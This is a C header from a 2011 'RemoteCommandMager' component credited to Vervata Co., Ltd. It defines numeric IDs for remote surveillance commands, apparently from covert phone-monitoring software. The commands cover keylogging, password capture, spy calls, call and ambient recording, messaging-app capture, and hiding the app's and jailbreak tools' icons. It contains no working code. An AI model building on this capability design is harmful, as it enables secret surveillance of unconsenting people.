
/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RemoteCmdSettingsCode
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  16/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

typedef enum
{
	kRemoteCmdSMS							= 1,
	kRemoteCmdCallLog						= 2,
	kRemoteCmdEmail							= 3,
	kRemoteCmdCellInfo						= 4,
	kRemoteCmdMMS							= 5,
	kRemoteCmdContact						= 6,
	kRemoteCmdLocation						= 7,
	kRemoteCmdIM							= 8,
	kRemoteCmdWallPaper						= 9,
    
	kRemoteCmdCameraImage					= 10,
	kRemoteCmdAudioRecording				= 11,   // Voice memo capture
	kRemoteCmdAudioConversation				= 12,   // Normal/VoIP call record
	kRemoteCmdVideoFile						= 13,
	kRemoteCmdPinMessage					= 14,
	kRemoteCmdApplicationLifeCycle			= 15,
	kRemoteCmdBrowserURL					= 16,
	kRemoteCmdCalendar						= 17,
	kRemoteCmdNote							= 18,
	kRemoteCmdKeyLog						= 19,
    
	kRemoteCmdVoIP							= 20,
    kRemoteCmdPageVisited                   = 21,
    kRemoteCmdPassword                      = 22,
    kRemoteCmdIMAppShot                     = 23,
    kRemoteCmdUsbConnection                 = 24,
    kRemoteCmdFileTransfer                  = 25,
    kRemoteCmdEmailAppShot                  = 26,
    kRemoteCmdAppUsage                      = 27,
    kRemoteCmdLogon                         = 28,
    kRemoteCmdNetworkConnection             = 29,   // Network adapter status
    
    kRemoteCmdNetworkTraffic                = 30,   // Control network package
    kRemoteCmdDoorAccess                    = 31,
    kRemoteCmdFileActivity                  = 32,
    kRemoteCmdPrintJob                      = 33,
	
	kRemoteCmdSetStartStopCapture			= 41,
	kRemoteCmdSetDeliveryTimer				= 42,
	kRemoteCmdSetEventCount					= 43,
	kRemoteCmdSetEnableWatch				= 44,
	kRemoteCmdSetWatchFlags					= 45,
	kRemoteCmdSetLocationTimer				= 46,
	kRemoteCmdPanicMode						= 47,
	kRemoteCmdNotificationNumbers			= 48,
    
	kRemoteCmdHomeNumbers					= 50,
	kRemoteCmdCISNumbers					= 51,
	kRemoteCmdMonitorNumbers				= 52,
	kRemoteCmdEnableSpyCall					= 53,
	kRemoteCmdEnableRestrictions			= 54,
	kRemoteCmdAddressBookManagementMode		= 55,
	kRemoteCmdVCARD_VERSION					= 56,
	kRemoteCmdEanbleApplicationProfile		= 57,
	kRemoteCmdEnableUrlProfile				= 58,
	kRemoteCmdEmergencyNumbers				= 59,
    
	kRemoteCmdWatchNumbers					= 60,
	kRemoteCmdEnableWaitingForApprovalPolicy= 61,
	kRemoteCmdAndroidRootStatus				= 62,
	kRemoteCmdSMSKeywords					= 63,
	kRemoteCmdEnableSpyCallOnFacetime		= 64,
	kRemoteCmdFaceTimeIDs					= 65,
	kRemoteCmdDeliveryMethod				= 66,
    kRemoteCmdCallRecordingWatchFlags       = 67,
    kRemoteCmdCallRecordingWatchNumbers     = 68,
    kRemoteCmdRootStatus                    = 69,
    
    kRemoteCmdURL                           = 70,
    kRemoteCmdApplicationIconVisibility     = 71,
    kRemoteCmdSuperUserIconVisibility       = 72,   // iPhone doesn't use it
    kRemoteCmdCydiaIconVisibility           = 73,
    kRemoteCmdPanguIconVisibility           = 74,
    kRemoteCmdIMAttachmentLimitSize         = 75,
    kRemoteCmdDebugLog                      = 76,
    kRemoteCmdInstallChromeExtension        = 77,
    kRemoteCmdInstallFirefoxExtension       = 78,
    kRemoteCmdVersionOfChromeExtension      = 79,
    
    kRemoteCmdVersionOfFirefoxExtension     = 80,
    kRemoteCmdMonitoredFileActivityType     = 81,
    kRemoteCmdExcludedFileActivityPaths     = 82,
    
    kRemoteCmdTemporalControlAmbientRecord  = 150,
    kRemoteCmdTemporalControlScreenshotRecord = 151,
    kRemoteCmdTemporalControlNetworkTraffic   = 152,
    
    kRemoteCmdIMWhatsApp					= 200,
    kRemoteCmdIMLINE                        = 201,
    kRemoteCmdIMFacebook					= 202,
    kRemoteCmdIMSkype                       = 203,
    kRemoteCmdIMBBM                         = 204,
    kRemoteCmdIMIMessage                    = 205,
    kRemoteCmdIMViber                       = 206,
    kRemoteCmdIMGoogleTalk                  = 207,
    kRemoteCmdIMWeChat                      = 208,
    kRemoteCmdIMYahooMessenger              = 209,
    
    kRemoteCmdIMSnapchat                    = 210,
    kRemoteCmdIMHangout                     = 211,
    kRemoteCmdIMSlingshot                   = 212,
    
    kRemoteCmdIMAppShotLINE                 = 300,
    kRemoteCmdIMAppShotSkype                = 301,
    kRemoteCmdIMAppShotYahooMessenger       = 302,
    kRemoteCmdIMAppShotGoogleTalk           = 303,
    kRemoteCmdIMAppShotQQ                   = 304,
    kRemoteCmdIMAppShotIMessage             = 305,
    kRemoteCmdIMAppShotWeChat               = 306,
    kRemoteCmdIMAppShotAIM                  = 307,
    kRemoteCmdIMAppShotTrillian             = 308,
    kRemoteCmdIMAppShotViber                = 309
} RemoteCmdSettingsID;